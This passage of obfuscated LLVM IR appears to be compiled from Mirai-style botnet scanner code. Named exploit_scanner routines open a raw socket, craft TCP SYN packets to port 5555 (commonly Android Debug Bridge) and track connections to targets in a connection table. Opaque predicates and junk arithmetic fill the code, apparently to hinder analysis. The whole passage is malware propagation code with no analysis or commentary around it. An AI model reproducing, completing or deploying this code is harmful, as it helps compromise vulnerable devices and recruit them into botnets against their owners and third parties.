  %1046 = sub nsw i32 256, %1045
  %1047 = call i32 @exploit_recv_strip_null(i32 %1034, i8* %1042, i32 %1046, i32 16384)
  store i32 %1047, i32* %32, align 4
  %1048 = load i32, i32* %32, align 4
  %1049 = icmp eq i32 %1048, 0
  %1050 = load i32, i32* @x.49
  %1051 = load i32, i32* @y.50
  %1052 = sub i32 %1050, 1
  %1053 = mul i32 %1050, %1052
  %1054 = urem i32 %1053, 2
  %1055 = icmp eq i32 %1054, 0
  %1056 = icmp slt i32 %1051, 10
  %1057 = or i1 %1055, %1056
  br i1 %1057, label %originalBBpart2237, label %originalBB220alteredBB

originalBBpart2237:                               ; preds = %originalBB220
  br i1 %1049, label %1058, label %1060

; <label>:1058:                                   ; preds = %originalBBpart2237
  %1059 = call i32* @__errno_location() #9
  store i32 104, i32* %1059, align 4
  store i32 -1, i32* %32, align 4
  br label %1060

; <label>:1060:                                   ; preds = %1058, %originalBBpart2237
  %1061 = load i32, i32* %32, align 4
  %1062 = icmp eq i32 %1061, -1
  br i1 %1062, label %1063, label %1127

; <label>:1063:                                   ; preds = %1060
  %1064 = call i32* @__errno_location() #9
  %1065 = load i32, i32* %1064, align 4
  %1066 = icmp ne i32 %1065, 11
  br i1 %1066, label %1067, label %1126

; <label>:1067:                                   ; preds = %1063
  %1068 = load i32, i32* @x.49
  %1069 = load i32, i32* @y.50
  %1070 = sub i32 %1068, 1
  %1071 = mul i32 %1068, %1070
  %1072 = urem i32 %1071, 2
  %1073 = icmp eq i32 %1072, 0
  %1074 = icmp slt i32 %1069, 10
  %1075 = or i1 %1073, %1074
  br i1 %1075, label %originalBB239, label %originalBB239alteredBB

originalBB239:                                    ; preds = %originalBB239alteredBB, %1067
  %1076 = call i32* @__errno_location() #9
  %1077 = load i32, i32* %1076, align 4
  %1078 = icmp ne i32 %1077, 11
  %1079 = load i32, i32* @x.49
  %1080 = load i32, i32* @y.50
  %1081 = sub i32 %1079, 1
  %1082 = mul i32 %1079, %1081
  %1083 = urem i32 %1082, 2
  %1084 = icmp eq i32 %1083, 0
  %1085 = icmp slt i32 %1080, 10
  %1086 = or i1 %1084, %1085
  br i1 %1086, label %originalBBpart2241, label %originalBB239alteredBB

originalBBpart2241:                               ; preds = %originalBB239
  br i1 %1078, label %1087, label %1126

; <label>:1087:                                   ; preds = %originalBBpart2241
  %1088 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1089 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1088, i32 0, i32 2
  %1090 = load i32, i32* %1089, align 8
  %1091 = icmp eq i32 %1090, 3
  br i1 %1091, label %1092, label %1114

; <label>:1092:                                   ; preds = %1087
  %1093 = load i32, i32* @x.49
  %1094 = load i32, i32* @y.50
  %1095 = sub i32 %1093, 1
  %1096 = mul i32 %1093, %1095
  %1097 = urem i32 %1096, 2
  %1098 = icmp eq i32 %1097, 0
  %1099 = icmp slt i32 %1094, 10
  %1100 = or i1 %1098, %1099
  br i1 %1100, label %originalBB243, label %originalBB243alteredBB

originalBB243:                                    ; preds = %originalBB243alteredBB, %1092
  %1101 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1102 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1101, i32 0, i32 0
  %1103 = load i32, i32* %1102, align 8
  %1104 = call i32 @close(i32 %1103)
  %1105 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  call void @exploit_setup_connection(%struct.exploit_scanner_connection* %1105)
  %1106 = load i32, i32* @x.49
  %1107 = load i32, i32* @y.50
  %1108 = sub i32 %1106, 1
  %1109 = mul i32 %1106, %1108
  %1110 = urem i32 %1109, 2
  %1111 = icmp eq i32 %1110, 0
  %1112 = icmp slt i32 %1107, 10
  %1113 = or i1 %1111, %1112
  br i1 %1113, label %originalBBpart2245, label %originalBB243alteredBB

originalBBpart2245:                               ; preds = %originalBB243
  br label %983

; <label>:1114:                                   ; preds = %1087
  %1115 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1116 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1115, i32 0, i32 0
  %1117 = load i32, i32* %1116, align 8
  %1118 = call i32 @close(i32 %1117)
  %1119 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1120 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1119, i32 0, i32 0
  store i32 -1, i32* %1120, align 8
  %1121 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1122 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1121, i32 0, i32 2
  store i32 0, i32* %1122, align 8
  %1123 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1124 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1123, i32 0, i32 6
  %1125 = getelementptr inbounds [256 x i8], [256 x i8]* %1124, i32 0, i32 0
  call void @util_zero(i8* %1125, i32 256)
  br label %1126

; <label>:1126:                                   ; preds = %1114, %originalBBpart2241, %1063
  br label %1161

; <label>:1127:                                   ; preds = %1060
  %1128 = load i32, i32* @x.49
  %1129 = load i32, i32* @y.50
  %1130 = sub i32 %1128, 1
  %1131 = mul i32 %1128, %1130
  %1132 = urem i32 %1131, 2
  %1133 = icmp eq i32 %1132, 0
  %1134 = icmp slt i32 %1129, 10
  %1135 = or i1 %1133, %1134
  br i1 %1135, label %originalBB247, label %originalBB247alteredBB

originalBB247:                                    ; preds = %originalBB247alteredBB, %1127
  %1136 = load i32, i32* %32, align 4
  %1137 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1138 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1137, i32 0, i32 5
  %1139 = load i32, i32* %1138, align 4
  %1140 = add nsw i32 %1139, %1136
  store i32 %1140, i32* %1138, align 4
  %1141 = load i32, i32* @exploit_fake_time, align 4
  %1142 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1143 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1142, i32 0, i32 1
  store i32 %1141, i32* %1143, align 4
  %1144 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1145 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1144, i32 0, i32 6
  %1146 = getelementptr inbounds [256 x i8], [256 x i8]* %1145, i32 0, i32 0
  %1147 = call i32 @util_strlen(i8* %1146)
  store i32 %1147, i32* %33, align 4
  %1148 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1149 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1148, i32 0, i32 6
  %1150 = load i32, i32* %33, align 4
  %1151 = sext i32 %1150 to i64
  %1152 = getelementptr inbounds [256 x i8], [256 x i8]* %1149, i64 0, i64 %1151
  store i8 0, i8* %1152, align 1
  %1153 = load i32, i32* @x.49
  %1154 = load i32, i32* @y.50
  %1155 = sub i32 %1153, 1
  %1156 = mul i32 %1153, %1155
  %1157 = urem i32 %1156, 2
  %1158 = icmp eq i32 %1157, 0
  %1159 = icmp slt i32 %1154, 10
  %1160 = or i1 %1158, %1159
  br i1 %1160, label %originalBBpart2253, label %originalBB247alteredBB

originalBBpart2253:                               ; preds = %originalBB247
  br label %983

; <label>:1161:                                   ; preds = %1126, %988
  br label %1162

; <label>:1162:                                   ; preds = %1161, %965
  %1163 = load i32, i32* @x.49
  %1164 = load i32, i32* @y.50
  %1165 = sub i32 %1163, 1
  %1166 = mul i32 %1163, %1165
  %1167 = urem i32 %1166, 2
  %1168 = icmp eq i32 %1167, 0
  %1169 = icmp slt i32 %1164, 10
  %1170 = or i1 %1168, %1169
  br i1 %1170, label %originalBB255, label %originalBB255alteredBB

originalBB255:                                    ; preds = %originalBB255alteredBB, %1162
  %1171 = load i32, i32* @x.49
  %1172 = load i32, i32* @y.50
  %1173 = sub i32 %1171, 1
  %1174 = mul i32 %1171, %1173
  %1175 = urem i32 %1174, 2
  %1176 = icmp eq i32 %1175, 0
  %1177 = icmp slt i32 %1172, 10
  %1178 = or i1 %1176, %1177
  br i1 %1178, label %originalBBpart2257, label %originalBB255alteredBB

originalBBpart2257:                               ; preds = %originalBB255
  br label %1179

; <label>:1179:                                   ; preds = %originalBBpart2257, %955, %925, %895, %829
  %1180 = load i32, i32* %1, align 4
  %1181 = add nsw i32 %1180, 1
  store i32 %1181, i32* %1, align 4
  br label %817

; <label>:1182:                                   ; preds = %817
  %1183 = load i32, i32* @x.49
  %1184 = load i32, i32* @y.50
  %1185 = sub i32 %1183, 1
  %1186 = mul i32 %1183, %1185
  %1187 = urem i32 %1186, 2
  %1188 = icmp eq i32 %1187, 0
  %1189 = icmp slt i32 %1184, 10
  %1190 = or i1 %1188, %1189
  br i1 %1190, label %originalBB259, label %originalBB259alteredBB

originalBB259:                                    ; preds = %originalBB259alteredBB, %1182
  %1191 = load i32, i32* @x.49
  %1192 = load i32, i32* @y.50
  %1193 = sub i32 %1191, 1
  %1194 = mul i32 %1191, %1193
  %1195 = urem i32 %1194, 2
  %1196 = icmp eq i32 %1195, 0
  %1197 = icmp slt i32 %1192, 10
  %1198 = or i1 %1196, %1197
  br i1 %1198, label %originalBBpart2261, label %originalBB259alteredBB

originalBBpart2261:                               ; preds = %originalBB259
  br label %217

originalBBalteredBB:                              ; preds = %originalBB, %40
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %80
  %1199 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %1199, i32* @exploit_rsck, align 4
  %1200 = icmp eq i32 %1199, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %99
  call void @exit(i32 0) #12
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %126
  %1201 = load i32, i32* @exploit_rsck, align 4
  %1202 = call i32 @close(i32 %1201)
  call void @exit(i32 0) #12
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %155
  store %struct.iphdr* bitcast ([40 x i8]* @exploit_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %1203 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %1204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1203, i64 1
  %1205 = bitcast %struct.iphdr* %1204 to %struct.anon.0*
  store %struct.anon.0* %1205, %struct.anon.0** %4, align 8
  %1206 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %1207 = bitcast %struct.iphdr* %1206 to i8*
  %1208 = load i8, i8* %1207, align 4
  %_ = sub i8 0, %1208
  %gen = add i8 %_, -16
  %1209 = and i8 %1208, -16
  %_15 = shl i8 %1209, 5
  %_16 = sub i8 0, %1209
  %gen17 = add i8 %_16, 5
  %_18 = shl i8 %1209, 5
  %_19 = sub i8 0, %1209
  %gen20 = add i8 %_19, 5
  %_21 = shl i8 %1209, 5
  %_22 = sub i8 %1209, 5
  %gen23 = mul i8 %_22, 5
  %_24 = shl i8 %1209, 5
  %_25 = sub i8 0, %1209
  %gen26 = add i8 %_25, 5
  %1210 = or i8 %1209, 5
  store i8 %1210, i8* %1207, align 4
  %1211 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %1212 = bitcast %struct.iphdr* %1211 to i8*
  %1213 = load i8, i8* %1212, align 4
  %_27 = sub i8 0, %1213
  %gen28 = add i8 %_27, 15
  %_29 = shl i8 %1213, 15
  %_30 = sub i8 0, %1213
  %gen31 = add i8 %_30, 15
  %_32 = sub i8 %1213, 15
  %gen33 = mul i8 %_32, 15
  %_34 = sub i8 0, %1213
  %gen35 = add i8 %_34, 15
  %_36 = sub i8 0, %1213
  %gen37 = add i8 %_36, 15
  %1214 = and i8 %1213, 15
  %_38 = sub i8 0, %1214
  %gen39 = add i8 %_38, 64
  %_40 = sub i8 %1214, 64
  %gen41 = mul i8 %_40, 64
  %1215 = or i8 %1214, 64
  store i8 %1215, i8* %1212, align 4
  %1216 = call zeroext i16 @htons(i16 zeroext 40) #9
  %1217 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %1218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1217, i32 0, i32 2
  store i16 %1216, i16* %1218, align 2
  %1219 = call i32 @rand_next()
  %1220 = trunc i32 %1219 to i16
  %1221 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %1222 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1221, i32 0, i32 3
  store i16 %1220, i16* %1222, align 4
  %1223 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %1224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1223, i32 0, i32 5
  store i8 64, i8* %1224, align 4
  %1225 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %1226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1225, i32 0, i32 6
  store i8 6, i8* %1226, align 1
  %1227 = call zeroext i16 @htons(i16 zeroext 5555) #9
  %1228 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %1229 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %1228, i32 0, i32 1
  store i16 %1227, i16* %1229, align 2
  %1230 = load i16, i16* %2, align 2
  %1231 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %1232 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %1231, i32 0, i32 0
  store i16 %1230, i16* %1232, align 4
  %1233 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %1234 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %1233, i32 0, i32 4
  %1235 = load i16, i16* %1234, align 4
  %_42 = sub i16 0, %1235
  %gen43 = add i16 %_42, -241
  %_44 = shl i16 %1235, -241
  %_45 = sub i16 0, %1235
  %gen46 = add i16 %_45, -241
  %_47 = shl i16 %1235, -241
  %_48 = shl i16 %1235, -241
  %_49 = sub i16 %1235, -241
  %gen50 = mul i16 %_49, -241
  %1236 = and i16 %1235, -241
  %_51 = shl i16 %1236, 80
  %_52 = sub i16 %1236, 80
  %gen53 = mul i16 %_52, 80
  %_54 = shl i16 %1236, 80
  %_55 = sub i16 0, %1236
  %gen56 = add i16 %_55, 80
  %1237 = or i16 %1236, 80
  store i16 %1237, i16* %1234, align 4
  %1238 = call i32 @rand_next()
  %_57 = shl i32 %1238, 65535
  %_58 = shl i32 %1238, 65535
  %_59 = sub i32 %1238, 65535
  %gen60 = mul i32 %_59, 65535
  %_61 = sub i32 %1238, 65535
  %gen62 = mul i32 %_61, 65535
  %_63 = shl i32 %1238, 65535
  %1239 = and i32 %1238, 65535
  %1240 = trunc i32 %1239 to i16
  %1241 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %1242 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %1241, i32 0, i32 5
  store i16 %1240, i16* %1242, align 2
  %1243 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %1244 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %1243, i32 0, i32 4
  %1245 = load i16, i16* %1244, align 4
  %_64 = shl i16 %1245, -513
  %_65 = shl i16 %1245, -513
  %_66 = sub i16 %1245, -513
  %gen67 = mul i16 %_66, -513
  %_68 = sub i16 %1245, -513
  %gen69 = mul i16 %_68, -513
  %_70 = sub i16 %1245, -513
  %gen71 = mul i16 %_70, -513
  %_72 = sub i16 0, %1245
  %gen73 = add i16 %_72, -513
  %1246 = and i16 %1245, -513
  %_74 = sub i16 0, %1246
  %gen75 = add i16 %_74, 512
  %_76 = sub i16 %1246, 512
  %gen77 = mul i16 %_76, 512
  %1247 = or i16 %1246, 512
  store i16 %1247, i16* %1244, align 4
  br label %originalBB14

originalBB81alteredBB:                            ; preds = %originalBB81, %223
  %1248 = load i32, i32* %1, align 4
  %1249 = icmp slt i32 %1248, 160
  br label %originalBB81

originalBB85alteredBB:                            ; preds = %originalBB85, %302
  store i32 0, i32* %18, align 4
  %1250 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %1251 = bitcast i8* %1250 to %struct.iphdr*
  store %struct.iphdr* %1251, %struct.iphdr** %20, align 8
  %1252 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %1253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1252, i64 1
  %1254 = bitcast %struct.iphdr* %1253 to %struct.anon.0*
  store %struct.anon.0* %1254, %struct.anon.0** %21, align 8
  %1255 = call i32* @__errno_location() #9
  store i32 0, i32* %1255, align 4
  %1256 = load i32, i32* @exploit_rsck, align 4
  %1257 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %1258 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %1258, align 8
  %1259 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %1260 = load %struct.sockaddr*, %struct.sockaddr** %1259, align 8
  %1261 = call i64 @recvfrom(i32 %1256, i8* %1257, i64 1514, i32 16384, %struct.sockaddr* %1260, i32* null)
  %1262 = trunc i64 %1261 to i32
  store i32 %1262, i32* %18, align 4
  %1263 = load i32, i32* %18, align 4
  %1264 = icmp sle i32 %1263, 0
  br label %originalBB85

originalBB89alteredBB:                            ; preds = %originalBB89, %347
  br label %originalBB89

originalBB93alteredBB:                            ; preds = %originalBB93, %364
  %1265 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %1266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1265, i32 0, i32 9
  %1267 = load i32, i32* %1266, align 4
  %1268 = load i32, i32* @LOCAL_ADDR, align 4
  %1269 = icmp ne i32 %1267, %1268
  br label %originalBB93

originalBB97alteredBB:                            ; preds = %originalBB97, %393
  br label %originalBB97

originalBB101alteredBB:                           ; preds = %originalBB101, %477
  %1270 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %1271 = load i32, i32* %18, align 4
  %1272 = sext i32 %1271 to i64
  %1273 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1270, i64 %1272
  %1274 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1273, i32 0, i32 2
  %1275 = load i32, i32* %1274, align 8
  %1276 = icmp eq i32 %1275, 0
  br label %originalBB101

originalBB105alteredBB:                           ; preds = %originalBB105, %508
  %1277 = load i32, i32* %18, align 4
  %_106 = sub i32 0, %1277
  %gen107 = add i32 %_106, 1
  %_108 = sub i32 0, %1277
  %gen109 = add i32 %_108, 1
  %_110 = sub i32 0, %1277
  %gen111 = add i32 %_110, 1
  %_112 = sub i32 %1277, 1
  %gen113 = mul i32 %_112, 1
  %1278 = add nsw i32 %1277, 1
  store i32 %1278, i32* %18, align 4
  br label %originalBB105

originalBB117alteredBB:                           ; preds = %originalBB117, %543
  br label %originalBB117

originalBB121alteredBB:                           ; preds = %originalBB121, %622
  %1279 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1280 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1279, i32 0, i32 2
  %1281 = load i32, i32* %1280, align 8
  %1282 = icmp eq i32 %1281, 4
  br label %originalBB121

originalBB125alteredBB:                           ; preds = %originalBB125, %643
  %1283 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1284 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1283, i32 0, i32 0
  %1285 = load i32, i32* %1284, align 8
  %_126 = shl i32 %1285, 64
  %_127 = sub i32 %1285, 64
  %gen128 = mul i32 %_127, 64
  %_129 = sub i32 0, %1285
  %gen130 = add i32 %_129, 64
  %_131 = shl i32 %1285, 64
  %_132 = sub i32 %1285, 64
  %gen133 = mul i32 %_132, 64
  %1286 = srem i32 %1285, 64
  %1287 = zext i32 %1286 to i64
  %_134 = sub i64 1, %1287
  %gen135 = mul i64 %_134, %1287
  %1288 = shl i64 1, %1287
  %1289 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %1290 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1291 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1290, i32 0, i32 0
  %1292 = load i32, i32* %1291, align 8
  %_136 = sub i32 0, %1292
  %gen137 = add i32 %_136, 64
  %_138 = sub i32 %1292, 64
  %gen139 = mul i32 %_138, 64
  %1293 = sdiv i32 %1292, 64
  %1294 = sext i32 %1293 to i64
  %1295 = getelementptr inbounds [16 x i64], [16 x i64]* %1289, i64 0, i64 %1294
  %1296 = load i64, i64* %1295, align 8
  %_140 = shl i64 %1296, %1288
  %_141 = sub i64 0, %1296
  %gen142 = add i64 %_141, %1288
  %_143 = shl i64 %1296, %1288
  %1297 = or i64 %1296, %1288
  store i64 %1297, i64* %1295, align 8
  %1298 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1299 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1298, i32 0, i32 0
  %1300 = load i32, i32* %1299, align 8
  %1301 = load i32, i32* %12, align 4
  %1302 = icmp sgt i32 %1300, %1301
  br label %originalBB125

originalBB147alteredBB:                           ; preds = %originalBB147, %680
  %1303 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1304 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1303, i32 0, i32 0
  %1305 = load i32, i32* %1304, align 8
  store i32 %1305, i32* %12, align 4
  br label %originalBB147

originalBB151alteredBB:                           ; preds = %originalBB151, %700
  br label %originalBB151

originalBB155alteredBB:                           ; preds = %originalBB155, %750
  %1306 = load i32, i32* %1, align 4
  %_156 = shl i32 %1306, 1
  %_157 = shl i32 %1306, 1
  %1307 = add nsw i32 %1306, 1
  store i32 %1307, i32* %1, align 4
  br label %originalBB155

originalBB161alteredBB:                           ; preds = %originalBB161, %769
  %1308 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 1
  store i64 0, i64* %1308, align 8
  %1309 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 0
  store i64 1, i64* %1309, align 8
  %1310 = load i32, i32* %12, align 4
  %1311 = load i32, i32* %11, align 4
  %1312 = icmp sgt i32 %1310, %1311
  br label %originalBB161

originalBB165alteredBB:                           ; preds = %originalBB165, %793
  %1313 = load i32, i32* %11, align 4
  br label %originalBB165

originalBB169alteredBB:                           ; preds = %originalBB169, %830
  %1314 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %1315 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1316 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1315, i32 0, i32 0
  %1317 = load i32, i32* %1316, align 8
  %_170 = sub i32 0, %1317
  %gen171 = add i32 %_170, 64
  %1318 = sdiv i32 %1317, 64
  %1319 = sext i32 %1318 to i64
  %1320 = getelementptr inbounds [16 x i64], [16 x i64]* %1314, i64 0, i64 %1319
  %1321 = load i64, i64* %1320, align 8
  %1322 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1323 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1322, i32 0, i32 0
  %1324 = load i32, i32* %1323, align 8
  %_172 = sub i32 %1324, 64
  %gen173 = mul i32 %_172, 64
  %_174 = sub i32 %1324, 64
  %gen175 = mul i32 %_174, 64
  %1325 = srem i32 %1324, 64
  %1326 = zext i32 %1325 to i64
  %_176 = shl i64 1, %1326
  %_177 = sub i64 1, %1326
  %gen178 = mul i64 %_177, %1326
  %_179 = sub i64 1, %1326
  %gen180 = mul i64 %_179, %1326
  %_181 = sub i64 0, 1
  %gen182 = add i64 %_181, %1326
  %1327 = shl i64 1, %1326
  %_183 = sub i64 %1321, %1327
  %gen184 = mul i64 %_183, %1327
  %_185 = sub i64 %1321, %1327
  %gen186 = mul i64 %_185, %1327
  %_187 = shl i64 %1321, %1327
  %_188 = sub i64 0, %1321
  %gen189 = add i64 %_188, %1327
  %_190 = sub i64 %1321, %1327
  %gen191 = mul i64 %_190, %1327
  %_192 = sub i64 %1321, %1327
  %gen193 = mul i64 %_192, %1327
  %_194 = shl i64 %1321, %1327
  %1328 = and i64 %1321, %1327
  %1329 = icmp ne i64 %1328, 0
  br label %originalBB169

originalBB198alteredBB:                           ; preds = %originalBB198, %874
  %1330 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1331 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1330, i32 0, i32 2
  %1332 = load i32, i32* %1331, align 8
  %1333 = icmp eq i32 %1332, 3
  br label %originalBB198

originalBB202alteredBB:                           ; preds = %originalBB202, %934
  %1334 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1335 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1334, i32 0, i32 2
  store i32 3, i32* %1335, align 8
  br label %originalBB202

originalBB206alteredBB:                           ; preds = %originalBB206, %994
  %1336 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1337 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1336, i32 0, i32 6
  %1338 = getelementptr inbounds [256 x i8], [256 x i8]* %1337, i32 0, i32 0
  %1339 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1340 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1339, i32 0, i32 6
  %1341 = getelementptr inbounds [256 x i8], [256 x i8]* %1340, i32 0, i32 0
  %1342 = getelementptr inbounds i8, i8* %1341, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1338, i8* %1342, i64 192, i32 1, i1 false)
  %1343 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1344 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1343, i32 0, i32 5
  %1345 = load i32, i32* %1344, align 4
  %_207 = sub i32 0, %1345
  %gen208 = add i32 %_207, 64
  %_209 = shl i32 %1345, 64
  %_210 = sub i32 0, %1345
  %gen211 = add i32 %_210, 64
  %_212 = shl i32 %1345, 64
  %_213 = shl i32 %1345, 64
  %_214 = sub i32 0, %1345
  %gen215 = add i32 %_214, 64
  %_216 = shl i32 %1345, 64
  %1346 = sub nsw i32 %1345, 64
  store i32 %1346, i32* %1344, align 4
  br label %originalBB206

originalBB220alteredBB:                           ; preds = %originalBB220, %1022
  %1347 = call i32* @__errno_location() #9
  store i32 0, i32* %1347, align 4
  %1348 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1349 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1348, i32 0, i32 0
  %1350 = load i32, i32* %1349, align 8
  %1351 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1352 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1351, i32 0, i32 6
  %1353 = getelementptr inbounds [256 x i8], [256 x i8]* %1352, i32 0, i32 0
  %1354 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1355 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1354, i32 0, i32 5
  %1356 = load i32, i32* %1355, align 4
  %1357 = sext i32 %1356 to i64
  %1358 = getelementptr inbounds i8, i8* %1353, i64 %1357
  %1359 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1360 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1359, i32 0, i32 5
  %1361 = load i32, i32* %1360, align 4
  %_221 = sub i32 0, 256
  %gen222 = add i32 %_221, %1361
  %_223 = shl i32 256, %1361
  %_224 = sub i32 0, 256
  %gen225 = add i32 %_224, %1361
  %_226 = sub i32 256, %1361
  %gen227 = mul i32 %_226, %1361
  %_228 = shl i32 256, %1361
  %_229 = sub i32 0, 256
  %gen230 = add i32 %_229, %1361
  %_231 = shl i32 256, %1361
  %_232 = sub i32 256, %1361
  %gen233 = mul i32 %_232, %1361
  %_234 = sub i32 256, %1361
  %gen235 = mul i32 %_234, %1361
  %1362 = sub nsw i32 256, %1361
  %1363 = call i32 @exploit_recv_strip_null(i32 %1350, i8* %1358, i32 %1362, i32 16384)
  store i32 %1363, i32* %32, align 4
  %1364 = load i32, i32* %32, align 4
  %1365 = icmp eq i32 %1364, 0
  br label %originalBB220

originalBB239alteredBB:                           ; preds = %originalBB239, %1067
  %1366 = call i32* @__errno_location() #9
  %1367 = load i32, i32* %1366, align 4
  %1368 = icmp ne i32 %1367, 11
  br label %originalBB239

originalBB243alteredBB:                           ; preds = %originalBB243, %1092
  %1369 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1370 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1369, i32 0, i32 0
  %1371 = load i32, i32* %1370, align 8
  %1372 = call i32 @close(i32 %1371)
  %1373 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
